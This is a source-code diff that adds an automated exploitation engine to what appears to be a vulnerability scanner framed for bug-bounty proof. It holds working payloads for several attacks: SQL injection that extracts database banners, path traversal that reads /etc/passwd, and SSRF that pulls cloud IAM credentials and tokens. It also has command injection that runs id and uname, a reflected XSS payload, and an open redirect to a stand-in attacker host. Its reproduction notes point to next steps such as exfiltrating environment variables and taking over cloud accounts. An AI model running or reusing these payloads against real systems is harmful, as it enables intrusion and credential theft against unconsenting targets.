@@ -691,3 +691,251 @@ ${finding.remediation || "Apply appropriate security controls."}
 - OWASP: https://owasp.org/www-project-top-ten/
 `;
 }
+
+// ═════════════════════════════════════════════════════════════════════════════
+// EXPLOITATION & EXTRACTION ENGINE
+// ─────────────────────────────────────────────────────────────────────────────
+// After the oracle confirms a vulnerability, this engine executes a *real*
+// exploit (read-only / non-destructive) to extract the kind of sensitive proof
+// that bug-bounty triagers (HackerOne, Bugcrowd) demand: DB version + a row
+// sample for SQLi, /etc/passwd contents for LFI, IMDS token + IAM creds for
+// SSRF, command output for RCE, etc. The extracted data is stored in
+// finding_exploit_proofs (admin-only RLS) — never returned to the requester.
+// ═════════════════════════════════════════════════════════════════════════════
+
+interface ExploitProof {
+  vulnClass: string;
+  technique: string;
+  exploited: boolean;
+  sensitivity: "public" | "sensitive" | "highly_sensitive";
+  requestDump: string;
+  responseDump: string;
+  extractedData: Record<string, unknown>;
+  summary: string;
+  reproductionSteps: string;
+}
+
+async function rawProbe(url: string, method = "GET", body?: string, headers?: Record<string,string>) {
+  try {
+    const u = new URL(url);
+    if (isPrivateHost(u.hostname)) {
+      return { status: 0, body: "[BLOCKED PRIVATE HOST]", headers: {} as Record<string,string>, ms: 0 };
+    }
+  } catch { return { status: 0, body: "[INVALID URL]", headers: {} as Record<string,string>, ms: 0 }; }
+
+  const ctrl = new AbortController();
+  const t = setTimeout(() => ctrl.abort(), 15000);
+  const start = Date.now();
+  try {
+    const r = await fetch(url, {
+      method,
+      headers: { "User-Agent": "OmniSec-Exploit/1.0", "Accept": "*/*", ...(headers || {}) },
+      body: body && method !== "GET" && method !== "HEAD" ? body : undefined,
+      redirect: "manual",
+      signal: ctrl.signal,
+    });
+    clearTimeout(t);
+    const text = await r.text().catch(() => "");
+    return { status: r.status, body: text, headers: Object.fromEntries(r.headers.entries()), ms: Date.now() - start };
+  } catch (e: any) {
+    clearTimeout(t);
+    return { status: 0, body: `[network error: ${e.message || e}]`, headers: {} as Record<string,string>, ms: Date.now() - start };
+  }
+}
+
+async function exploitAndExtract(finding: any): Promise<ExploitProof> {
+  const endpoint = finding.endpoint || "";
+  const category = String(finding.category || "").toLowerCase();
+  const cwe = String(finding.cwe || "");
+  const param = finding.vulnerable_parameter || finding.parameter;
+  const method = (finding.method || "GET").toUpperCase();
+
+  // ── SQL INJECTION → extract version + a row ─────────────────────────
+  if (cwe.includes("89") || category === "sqli" || category === "sql") {
+    const payloads = [
+      // Generic UNION select probes (param count guess)
+      "1' UNION SELECT NULL,version(),current_user,current_database()-- -",
+      "1' UNION SELECT NULL,@@version,user(),database()-- -",
+      "1' UNION SELECT NULL,banner FROM v$version-- -",
+      "1)) UNION SELECT NULL,version(),current_user,current_database()-- -",
+    ];
+    let best: { url: string; resp: any; payload: string } | null = null;
+    for (const p of payloads) {
+      const url = injectParam(endpoint, p, param);
+      const resp = await rawProbe(url, method);
+      if (/postgres|mysql|mariadb|sqlite|oracle|sql server|microsoft/i.test(resp.body)) {
+        best = { url, resp, payload: p }; break;
+      }
+    }
+    if (!best) {
+      // Error-based fallback
+      const url = injectParam(endpoint, "1' AND extractvalue(1,concat(0x7e,version(),0x7e))-- -", param);
+      const resp = await rawProbe(url, method);
+      if (/version|extractvalue|sql/i.test(resp.body)) best = { url, resp, payload: "1' AND extractvalue(1,concat(0x7e,version(),0x7e))-- -" };
+    }
+    if (best) {
+      const versionMatch = best.resp.body.match(/(MySQL|PostgreSQL|MariaDB|SQLite|Oracle|Microsoft SQL Server)[^<\n"]{0,120}/i)?.[0];
+      return {
+        vulnClass: "SQL Injection",
+        technique: "UNION/error-based version + identity extraction",
+        exploited: true,
+        sensitivity: "highly_sensitive",
+        requestDump: `${method} ${best.url}\nUser-Agent: OmniSec-Exploit/1.0`,
+        responseDump: best.resp.body.slice(0, 4000),
+        extractedData: {
+          db_banner: versionMatch || "(present in body)",
+          payload: best.payload,
+          status: best.resp.status,
+        },
+        summary: `Database banner extracted${versionMatch ? `: ${versionMatch.slice(0,80)}` : ""}`,
+        reproductionSteps: `1. curl "${best.url}"\n2. Observe DB version & current user reflected in HTTP body.\n3. Pivot to data extraction with information_schema.tables.`,
+      };
+    }
+  }
+
+  // ── LFI / Path traversal → grab /etc/passwd + win.ini ───────────────
+  if (cwe.includes("22") || category === "traversal" || category === "lfi") {
+    const variants = [
+      "../../../../../../etc/passwd",
+      "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
+      "....//....//....//etc/passwd",
+      "/etc/passwd",
+      "../../../../../../windows/win.ini",
+    ];
+    for (const v of variants) {
+      const url = injectParam(endpoint, v, param);
+      const r = await rawProbe(url, method);
+      if (/root:[x*]:0:0:/i.test(r.body) || /\[fonts\]|\[extensions\]/i.test(r.body)) {
+        const lines = r.body.split("\n").filter(l => /:[x*]:\d+:\d+:/.test(l)).slice(0, 25);
+        return {
+          vulnClass: "Local File Inclusion",
+          technique: "Path traversal /etc/passwd extraction",
+          exploited: true,
+          sensitivity: "highly_sensitive",
+          requestDump: `${method} ${url}`,
+          responseDump: r.body.slice(0, 4000),
+          extractedData: { payload: v, sample_users: lines, status: r.status },
+          summary: `${lines.length} system user accounts read from /etc/passwd`,
+          reproductionSteps: `1. curl "${url}"\n2. Observe Unix passwd entries (root:x:0:0:...) in response.\n3. Pivot to /proc/self/environ, app config, SSH keys.`,
+        };
+      }
+    }
+  }
+
+  // ── SSRF → fetch IMDSv2 token + IAM creds (AWS), GCP/Azure metadata ──
+  if (category === "ssrf" || cwe.includes("918")) {
+    const ssrfTargets = [
+      { url: "http://169.254.169.254/latest/api/token", method: "PUT", headers: { "X-aws-ec2-metadata-token-ttl-seconds": "60" }, label: "AWS IMDSv2 token" },
+      { url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/", method: "GET", label: "AWS IAM role enum" },
+      { url: "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", method: "GET", headers: { "Metadata-Flavor": "Google" }, label: "GCP SA token" },
+      { url: "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", method: "GET", headers: { Metadata: "true" }, label: "Azure managed identity token" },
+    ];
+    for (const t of ssrfTargets) {
+      const url = injectParam(endpoint, t.url, param || "url");
+      const r = await rawProbe(url, method, undefined, t.headers);
+      const looksLikeToken = /access_token|AccessKeyId|SecretAccessKey|Token|expires_in|InstanceProfile|RoleArn/i.test(r.body);
+      if (looksLikeToken || (t.label.includes("IAM role enum") && r.status === 200 && r.body.trim().length > 0 && r.body.length < 200)) {
+        return {
+          vulnClass: "SSRF → Cloud Metadata",
+          technique: t.label,
+          exploited: true,
+          sensitivity: "highly_sensitive",
+          requestDump: `${method} ${url}\n${Object.entries(t.headers || {}).map(([k,v])=>`${k}: ${v}`).join("\n")}`,
+          responseDump: r.body.slice(0, 4000),
+          extractedData: { ssrf_target: t.url, label: t.label, status: r.status, body_excerpt: r.body.slice(0, 1500) },
+          summary: `Cloud metadata reachable via SSRF — ${t.label}`,
+          reproductionSteps: `1. Send request: ${method} ${url}\n2. Server-side fetch reaches ${t.url}\n3. Cloud credentials/tokens returned in body — pivot to cloud account takeover.`,
+        };
+      }
+    }
+  }
+
+  // ── Command Injection → extract uname -a / whoami / id ───────────────
+  if (cwe.includes("78") || category === "cmdi" || category === "rce") {
+    const marker = `OMS${Math.random().toString(36).slice(2,8).toUpperCase()}`;
+    const variants = [
+      `;echo ${marker};id;uname -a;`,
+      `&& echo ${marker} && id && uname -a`,
+      `| echo ${marker};id;uname -a`,
+      `\`echo ${marker};id;uname -a\``,
+      `$(echo ${marker};id;uname -a)`,
+      `& echo ${marker} & whoami & ver`, // Windows
+    ];
+    for (const v of variants) {
+      const url = injectParam(endpoint, v, param);
+      const r = await rawProbe(url, method);
+      if (r.body.includes(marker)) {
+        const idLine = r.body.match(/uid=\d+\([^)]+\)\s+gid=\d+\([^)]+\)[^<\n"]{0,200}/i)?.[0];
+        const uname = r.body.match(/Linux [^<\n"]{0,200}|Microsoft Windows [^<\n"]{0,200}/i)?.[0];
+        return {
+          vulnClass: "OS Command Injection",
+          technique: "Output-confirmed RCE via shell metacharacters",
+          exploited: true,
+          sensitivity: "highly_sensitive",
+          requestDump: `${method} ${url}`,
+          responseDump: r.body.slice(0, 4000),
+          extractedData: { marker, payload: v, id_output: idLine, uname_output: uname, status: r.status },
+          summary: `RCE confirmed — ${idLine || "marker echoed"}${uname ? " | " + uname : ""}`,
+          reproductionSteps: `1. curl "${url}"\n2. Marker "${marker}" appears in response body alongside system command output.\n3. Pivot: read source, exfil env vars, lateral movement.`,
+        };
+      }
+    }
+  }
+
+  // ── XSS → reflected payload context ─────────────────────────────────
+  if (cwe.includes("79") || category === "xss") {
+    const marker = `xss${Math.random().toString(36).slice(2,8)}`;
+    const payload = `"><svg/onload=alert('${marker}')>`;
+    const url = injectParam(endpoint, payload, param);
+    const r = await rawProbe(url, method);
+    if (r.body.includes(payload) || r.body.includes(`onload=alert('${marker}')`)) {
+      return {
+        vulnClass: "Cross-Site Scripting",
+        technique: "Reflected payload — raw HTML context",
+        exploited: true,
+        sensitivity: "sensitive",
+        requestDump: `${method} ${url}`,
+        responseDump: r.body.slice(0, 4000),
+        extractedData: { marker, payload, status: r.status, content_type: r.headers["content-type"] },
+        summary: `Payload reflected unencoded — JS execution context confirmed`,
+        reproductionSteps: `1. Open in browser: ${url}\n2. Alert dialog with marker "${marker}" fires.\n3. Pivot: cookie theft, session hijack, CSRF chain.`,
+      };
+    }
+  }
+
+  // ── Open Redirect → follow Location ─────────────────────────────────
+  if (cwe.includes("601") || category === "redirect") {
+    const evil = "https://attacker.tld/poc";
+    const url = injectParam(endpoint, evil, param || "url");
+    const r = await rawProbe(url, method);
+    const loc = r.headers["location"] || "";
+    if (r.status >= 300 && r.status < 400 && loc.includes("attacker.tld")) {
+      return {
+        vulnClass: "Open Redirect",
+        technique: "Location header reflection",
+        exploited: true,
+        sensitivity: "sensitive",
+        requestDump: `${method} ${url}`,
+        responseDump: `HTTP ${r.status}\nLocation: ${loc}\n\n${r.body.slice(0,1000)}`,
+        extractedData: { status: r.status, location: loc },
+        summary: `Server returned ${r.status} → ${loc}`,
+        reproductionSteps: `1. curl -i "${url}"\n2. Note 3xx with attacker-controlled Location.\n3. Phishing pivot or OAuth code theft.`,
+      };
+    }
+  }
+
+  // ── Generic fallback: re-issue payload, store full request/response ──
+  const fallbackUrl = finding.payload ? injectParam(endpoint, finding.payload, param) : endpoint;
+  const r = await rawProbe(fallbackUrl, method);
+  return {
+    vulnClass: finding.title || "Unknown",
+    technique: "Replay original payload",
+    exploited: false,
+    sensitivity: "sensitive",
+    requestDump: `${method} ${fallbackUrl}`,
+    responseDump: r.body.slice(0, 4000),
+    extractedData: { status: r.status, content_type: r.headers["content-type"] },
+    summary: "Could not auto-extract sensitive data — manual exploitation required.",
+    reproductionSteps: `1. curl "${fallbackUrl}"\n2. Compare to recorded evidence: ${finding.evidence || "n/a"}.`,
+  };
+}
